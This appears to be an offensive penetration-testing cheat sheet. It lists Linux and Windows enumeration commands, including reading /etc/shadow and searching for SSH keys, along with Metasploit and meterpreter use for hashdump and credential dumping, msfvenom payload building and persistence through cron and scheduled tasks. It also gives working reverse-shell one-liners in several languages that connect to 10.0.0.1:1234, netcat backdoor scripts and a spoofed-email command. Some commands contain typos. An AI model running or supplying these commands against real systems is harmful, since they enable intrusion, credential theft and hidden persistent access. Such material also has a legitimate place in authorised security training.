# ENUMERATION - SYSTEM, USERS, FILES, PROCESSES, SERVICES, TASKS, NETWORK INFO, RUNAS

## System & User Information

##### Get System Info
| Linux | Windows |
|:-----:|:-----:|
|```uname -a && cat /proc/version```|```systeminfo```|

##### Get Current User

| Linux | Windows |
|:-----:|:-----:|
|```whoami```|```echo %USERNAME```|

##### Who's Logged On Currently

| Linux | Windows |
|:-----:|:-----:|
|```who -a```|```?```|

##### Get All Users On Machine

| Linux | Windows |
|:-----:|:-----:|
|```cat /etc/passwd```|```net user```|

##### Get All Groups On Machine

| Linux | Windows |
|:-----:|:-----:|
|```cat /etc/group```|```net localgroup```|

##### Get Password Hashes

| Linux | Windows |
|:-----:|:-----:|
|```cat /etc/shadow```|fgdump.exe / meterpreter hashdump / kiwi|

##### Does Current User Have Special Priv

| Linux | Windows |
|:-----:|:-----:|
|```sudo -l```|```whoami /priv```|

##### Get Current User's Command History

| Linux | Windows |
|:-----:|:-----:|
|```cat ~/.bash_history```|```doskey /history```(resets w/ new cmd.exe)|

## Network Information

##### List Network Adapter Settings

| Linux | Windows |
|:-----:|:-----:|
|```ip addr show```|```ipconfig /all```|

##### Show IP Routes

| Linux | Windows |
|:-----:|:-----:|
|```netstat -r```|```netstat -r```|

##### Show All Listening Ports & Connections

| Linux | Windows |
|:-----:|:-----:|
|```netstat -anop```|```netstat -anop```|

## Linux - Interesting Files / Places to Look

##### List Current User's Various History Files
```ls -la ~/.*_history```

##### Can I Read root's History Files
```ls -la /root/.*_history```

##### Check For Interesting ssh Files In Current User's Directory
```la -la ~/.ssh/```

##### Find ssh Keys /host Information
```find / -name "id_dsa*" -o -name "id_rsa" -o -name "known_hosts" -o -name "authorized hosts" -o -name "authorized_keys" 2>/dev/null | xargs -r ls -la```

##### Find SUID root Files
```find / -user root -perm -4000 -print 2>/dev/null```

##### Find SGID root Files
```find / -group root -perm -2000 -print 2>/dev/null```

##### Find SUID/GUID Files Owned By Anyone
```find / -perm -2000 -o -perm -4000 -print 2>/dev/null```

##### List Open Files
```lsof```

##### Search For Files & Within Results
```find / "[string]" | grep "[string]"```

##### View Running Services
```ps -elf```

##### Lookup Running Process Binaries and Permissions
```ps -aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'```

##### Open Crontab for Editing
```crontab -e```

##### Display All Scheduled cron Jobs
```ls -la /etc/cron*```

## Windows - Interesting Files / Places to Look

##### Get Owner of Directory
```dir [location] /Q```

##### Get Permission of Location/File
```icacls [location]```

##### Find Client-Side Programs
```dir /s /b "C:\Program Files\*.exe"```

##### Lookup Common Startups
```
reg query
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
```

##### Run Command As Another User
```runas /savecred /user:[hostname]\[user] "CMD.EXE" /K [command to run]```

##### Search For Files & Within Results
```dir "[string]" /s | find "[string]"```

##### View Running Processes
```tasklist /SVC```

##### Query Status of Services
```sc queryex```

##### Other Service Controls
```sc```[option] start, stop, config, qc (config info)

##### Schedule a task
```schtasks /create```

##### Display All Scheduled Tasks
```schtasks /query /fo LIST /v```

# METASPLOIT, PROXYCHAINS, SOCKS4A, MSFVENOM, WINDOWS & UNIX PERSISTENCE

## METASPLOIT

##### Search [options]
```
type:[auxiliary | exploit | post]
platform:[linux | windows | etc]
name:[string]
info:[module_name]
grep [string] search [options]
```

##### Using A Module
```
use [module_name]
show options (show options for module)
show advanced (show more options - if available)
set [option] [value] (set value for options)
set target [number] (some mods have this option)
run/exploit (fire module)
```

##### Using A Payload
```
(at module prompt): show payloads (shows compatible payloads for module)
show options (show options for payload)
set [option] [value] (set value for option specified]
```

##### Manage Sessions & Jobs
```
ctrl + z (or) background (places active session in the background)
sessions -l (view all active sessions)
sessions [number] (enter specific session number)
sessions -u [number] (attempt to upgrade specific session to full meterpreter session)
jobs -l (list running jobs)
jobs -k [number] (kill specified job)
```

##### Using multi/handler
Used to listen for callbacks
```
Configure:
lhost (callback host)
lport (callback port)
```

##### Routes
Used to 'pivot' through a compromised system
```
route print (show current routes)
route add [IP] [destination netmask] [session #]
```

##### Proxychains & SOCKS Proxy
```
use auxiliary/server/socks4a
set lport [number] (this should match the port in /etc/proxychains/conf)
run

**If you update a route in MSF, restart your proxy

proxychains [cmd] (run a command using proxy)
```

##### Modules Used in Practice & Ports
```
21 - exploit/windows/ftp/servu_mdtm
25 - exploit/windows/smtp/mercury_cram_md5
80 - exploit/windows/http/savant_31_overflowwindows/meterpreter/reverse_tcp
80 - exploit/unix/webapp/tikiwiki_graph_formula_execphp/meterpreter/reverse_tcp
135 - windows/dcerpc/ms03_026_dcomwindows/meterpreter/reverse_tcp
445 - windows/smb/ms17_010_eternalblue
445 - windows/smb/ms17_010_psexec

post/windows/gather/hashdump (can grab hashes without meterpreter)
```

##### Privalege Escalation Module
```
exploit/windows/local/ms10_015_kitrap0d
```

##### MSF Notes
Recommend trying reverse_tcp shells first, if unsuccessful, try a bind_tcp

## Meterpreter

##### Commands
```
help
ls
cat
cd
run [tab x2]
upload [local file] [target_dir]
download [requested file]
ifconfig
netstat
route
ps
sysinfo
getuid
getpid
getsystem (attempt to gain SYSTEM access)
hashdump
migrate [PID] (migrate into specified process - can be used to Priv Esc - try services, svchost, spool to pivot into others)
load kiwi | creds_all (dumps pwd - requires system)
load python (gives python options)
```

##### Meterpreter Persistence - Windows
```
run persistence -X -i 5 -p [port] -r [Attacker IP] (if use -A, auto configs listener - otherwise use multi/handler in MSF)
run getgui -e (listen for remote login)
(attack machine) rdesktop [IP]
```

## MSFVENOM

##### Creating a Payload
```
msfvenom -a [architecture] --platform [platform] -p [payload] lhost=[attacker IP] lport=[port] -f [format(.exe,.elf)] -o [output_filename]
```
Can use any payload from MSF
Use MSF multi/handler to catch call backs - ensure to use same payload as MSFVENOM

## UNIX Persistence

##### crontab Persistence
```
export EDITOR=nano (will force cron to use nano)
crontab -e (edit cronjobs)
```
Using MSFVENOM or shell script with netcat `nc`, set cronjob to execute every X minutes
```
*/[min] * * * * [script file path]
```

##### UNIX Persistence - MSF Modules (not all tested)
```
exploit/linux/local/service_persistence (launches payload as a service)
exploit/linux/local/cron_persistence (adds a cronjob to launch the payload)
exploit/linux/local/at_persistence (adds an at job that launches the payload)
exploit/linux/local/sshkey_persistence (returns with private key to access ssh without a pw for user)
```

##### UNIX Persistence with /etc/init.d/
Scripts placed within this directory could add persistence if configured

## WINDOWS Persistence

##### SCHTASKS
```
SCHTASKS /CREATE /sc minute /mo 1 /TN "[name]" /TR "C:\[filepath.exe]" /RU SYSTEM
SCHTASKS /CREATE /sc onstart /TN "[name]" /TR "C:\[filepath.exe]" /RU SYSTEM
```
Listen for callback of configured payload
See Meterpreter section for more Windows options

# SSH TUNNELING, NETSH FORWARDING, UPGRADE BASIC SHELLS, REVERSE SHELLS, NOTES, BASIC SCRIPTS

## SSH Tunneling / Port Forwarding

##### SSH Forward Tunnel
```
bob> ssh -L [listen port]:[target_IP] [user]@[intermdiary_IP]
bob> wget http://127.0.0.1:80
```

##### SSH Reverse Tunnel
```
web> ssh -R [listen port]:127.0.0.1:22
bob> ssh -p 2222 web@127.0.0.1
```

## Windows netsh Port Forwarding
```
netsh interface portproxy add v4tov4 listenport=2222 connectport=22 connectaddress=[linux IP]
```

## Python Priv Esc
```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("[IP]",[RHP]))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/bash","-i"])
```

## Ways to Upgrade a Basic Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
perl -e 'exec "/bin/sh";'
:!bash (within Vi/Vim)
!bash (within man, more, less, etc)
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'; awk 'BEGIN {system("/bin/bash")}'
```

## Reverse Shells

##### Python Rev Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### Perl Rev Shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### php Rev Shell
```
php -r '$sock=fscokopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### ruby Rev Shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

##### netcat Rev Shell
```
nc -e /bin/sh 10.0.0.1 1234
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
```

## Send Email Commands
```
sendEmail -f [spoof_email] -t [target_email] -u ["subject"] -m ["message"] -s [email svr IP:port] -a [attachment]
```

## netcat Batch Script (backdoor)
would use schtasks to run this
```
create .bat
@echo off
:A
nc.exe -e cmd.exe [IP] [port]
goto :A
```

## netcat Bash Script (backdoor)
would use cronjob to run this
```
!#/bin/bash
nc -e /bin/bash [IP] [port]
```

## Enable Auto-Complete (Unsure functionality works)
```
bg
stty raw -echo
fg
```

## Notes to take during Ops
```
IP
Hostname
Exploit Used
Payload Used
lport used

Initial User
Additional Users

hashdump & creds
Important Files

Misc Info
Additional Notes
```

# SAMBA, WEB SERVER, STEG, FIREWALLS, NETCAT, GET/CRACK HASHES, SNMP, CREATE USER, SCANS, U&E

##

